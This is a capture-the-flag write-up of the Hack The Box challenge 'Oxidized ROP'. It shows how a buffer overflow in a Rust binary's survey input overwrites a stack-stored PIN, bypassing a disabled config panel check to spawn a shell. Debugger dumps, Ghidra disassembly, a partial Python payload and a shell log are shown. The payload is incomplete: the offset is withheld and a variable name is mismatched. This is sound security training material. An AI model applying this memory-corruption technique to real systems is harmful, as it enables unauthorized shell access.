HTB Challenge

Extracting it gets us a folder with a binary, and a `.rs`. This tells us that the binary is compiled in rust, so make sure that any ghidra instance you have is updated to at least ghidra 11, as that version adds rust support for decompilation.

reading through the code, two things immediately jumps out
```rust
fn present_config_panel(pin: &u32) {
    use std::process::{self, Stdio};

    // the pin strength isn't important since pin input is disabled
    if *pin != 123456 {
        println!("Invalid Pin. This incident will be reported.");
        return;
    }

    process::Command::new("/bin/sh")
        .stdin(Stdio::inherit())
        .stdout(Stdio::inherit())
        .output()
        .unwrap();
}
```
```rust
unsafe {
	for c in src.chars() {
		dest_ptr.write(c);
		dest_ptr = dest_ptr.offset(1);
	}
}
```

this is in the `save_data` function. to get to this, we need to get to the `present_survey` function, which is achieved via the menu options, by entering in `1` when prompted.

And our target: `present_config_panel`. this clearly spawns a shell we can use. But we need to pass by a pin requirement first.

lets try this out!

Seems like, if we just enter a normal string into `present_survey`, nothing seems to happen.... however, lets follow along in gbd (I like pwndbg, and to use pwntools+splitmind myself) maybe we can find something interesting.

Rust binaries are a bit complicated to stop and see what it is doing. if you do a `break *main`, you only get the outer binary that is essentially in (compiled) C and doesnt execute the binary itself. The best technique I have found is to see what tab-complete has on offer. if you actually do break at main, you can see rust like syntax, all of which starts with `oxidized_rop::`. So, gdb (or pwndbg, idk at this point) is smart enough to pick up on the rust functions, easy enough, just set breakpoints on them. set one on `main`, and once you found it, on `present_survey` .You need to definitely save those breakpoint names, as its handy to have them later. Go through the process, until a few calls after your input.... Hmm, that looks familar. I used `helloworld`, and in the stack, this popped up!

```gdb
10:0080│     0x7fffd379ba70 —▸ 0x7fffd379bd20 ◂— 0x6500000068 /* 'h' */
```

Wild guess, but lets look at that address with `x/11x`.

```gdb
pwndbg> x/11x 0x7fffd379bd20
0x7fffd379bd20: 0x00000068      0x00000065      0x0000006c      0x0000006c
0x7fffd379bd30: 0x0000006f      0x00000077      0x0000006f      0x00000072
0x7fffd379bd40: 0x0000006c      0x00000064      0x00000000 
```

If you take the time to translate this, its the `helloworld` string I used! and.. in a weird format.

Long story short, this is Unicode. This article can do a good description of [Unicode](https://realpython.com/python-encodings-guide/#enter-unicode), but the TL;DR is that in its standard it incorporates simple ascii codes, but it is a 8 byte encoding specification, that can range from (in hex) 0x0 to 0x10FFFF. This means, you could send it emojis, and it would still work plain and simple. in fact, lets demonstrate this. `hello😀world` is my input 

```gdb
pwndbg> x/12x 0x7ffdab06e8c0
0x7ffdab06e8c0: 0x00000068      0x00000065      0x0000006c      0x0000006c
0x7ffdab06e8d0: 0x0000006f      0x0001f600      0x00000077      0x0000006f
0x7ffdab06e8e0: 0x00000072      0x0000006c      0x00000064      0x00000000
```

and there it is! our emoji 😀 is encoded in Unicode as `U+1F600`. looking at the binary, we have  `0x0001f600`, which matches the position and encoding of our little smiling friend.

Okay, we know the encoding, but that will only come in handy later on. What about exceeding this limit of 200 characters?

Lets feed it 200 characters.

Something that immediately jumps out to me is that the backtrace is overwritten, implying the existence of a rop based exploit. however, this is rust, not C, so this would involve developing a brand new exploit, so no thank you. But this should mean stuff was overwritten! Moving further on, when the program returns to the main function, the stack appears completely overwritten.
```
00:0000│ rsp 0x7ffcc4de7930 ◂— 0x0                                                 01:0008│     0x7ffcc4de7938 ◂— 0x0
02:0010│     0x7ffcc4de7940 ◂— 0x6100000061 /* 'a' */                              03:0018│     0x7ffcc4de7948 ◂— 0x6100000061 /* 'a' */                              04:0020│     0x7ffcc4de7950 ◂— 0x6100000062 /* 'b' */                              05:0028│     0x7ffcc4de7958 ◂— 0x6100000061 /* 'a' */                              
...
```
This we can work with! Also, proceeding down the program, we seem to stumble upon the config_panel, even though its technically disabled in the source code, as I recall. Alright, I guess! Lets look back at the source code, specifically where the options are selected

```rust
match get_option().expect("Invalid Option") {
	MenuOption::Survey => present_survey(&mut feedback),
	MenuOption::ConfigPanel => {
		if PIN_ENTRY_ENABLED {
			let mut input = String::new();
			print!("Enter configuration PIN: ");
			io::stdout().flush().unwrap();
			io::stdin().read_line(&mut input).unwrap();
			login_pin = input.parse().expect("Invalid Pin");
		} else {
			println!("\nConfig panel login has been disabled by the administrator.");
		}

		present_config_panel(&login_pin);
	}
	MenuOption::Exit => break,
}
```

`present_config_panel` seems to be selected, even when its disabled. I dont think thers a way to input the right pin, but since our buffer has been overwritten with our data, we might not need to input a pin directly.

Lets take a second to look at the function in `ghidra`. Ghidra over the years has gotten better at handling rust, but its still somewhat of a mess to get to the actual `present_config_panel`. The function does not appear on the functions list, and the only way to actually find the function is to go to the namespace (who does that for functions?) and know to select the `o` folder, and look at the `oxidized_rop` object. You can do that, or follow the rust calls from `main` in the program, which is how I did this before discovering the namespace trick.

Anyways, in both the source code, and the interpreted code from ghidra, it compares the pin to the value 123456. In ghidra, however, its directly compared to a value on the stack, very soon after the call compared to some C functions.
```Ghidra
			 oxidized_rop::present_config_panel                           
0010c890 48 81 ec        SUB        RSP,0x1a8
		 a8 01 00 00
0010c897 81 3f 40        CMP        dword ptr [RDI],0x1e240
		 e2 01 00
0010c89d 75 2c           JNZ        [return subroutine]
```

However, its on the stack, which we have control over already! looking at the `rdi` register in gdb once we hit `present_config_panel` with `x/14x` shows us that, yes, indeed, we can hit this value.

```gdb
pwndbg> x/14x $rdi
0x7ffc20300528: 0x00000061      0x01000062      0x00000062      0x00000061
0x7ffc20300538: 0x00000061      0x00000062      0x00000063      0x00000061
0x7ffc20300548: 0x00000000      0x00000000      0x00000000      0x01000002 
0x7ffc20300558: 0x2eb6c880      0x000055da 
```

With a bit of trial and error, and assistance with cyclical input, we can reach to the required offset. What the offset is, that is an exercise left up to the reader. heres a hint, pwndbg and others have cyclical strings that will help you identify the position you are at with the context you can give it.

Once we get the right offset, we can see a difference in the output in the same function.
```gdb
pwndbg> x/10x $rdi
0x7ffef6e2bf68: 0x00000061      0x01ffffff      0xc0d55b30      0x00005564
0x7ffef6e2bf78: 0x00000001      0x00000000      0xf662e000      0x00007ffe 
0x7ffef6e2bf88: 0x00000000      0x00000000 
```

The goal is to get the value at `rdi` to equal `123456`, or `0x1e240` according to Ghidra. Recalling earlier that the input is processed in Unicode, we can actually give it a Unicode character, and that will grant us a shell! This cannot be done manually (easily), so lets use python. to represent a character in Unicode, you can use `\u` for any four hex amount, but for values beyond that, you need to use `\U` which takes in 8 hex  digits with a value of anything up to the max for Unicode which is `10FFFF`.

```python
char = '\U0001E240'
offset = exercise_for_the_reader
input = b'A'*offset+bytes(char2,"utf-8")
```

and you can either feed this in with pwntools, or copy paste it directly in. doing this.....

```zsh
$ ./attackv2.py
[*] '/home/kali/htb/challenge/pwn_oxidizedrop/pwn_oxidized_rop/oxidized-rop'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/kali/htb/challenge/pwn_oxidizedrop/pwn_oxidized_rop/oxidized-rop': pid 2537365
[*] Switching to interactive mode
 
Config panel login has been disabled by the administrator.
$ whoami
kali
```

doing this, I have a clean escalation to shell. Now deploy this on the remote target and....

https://www.hackthebox.com/achievement/challenge/158887/458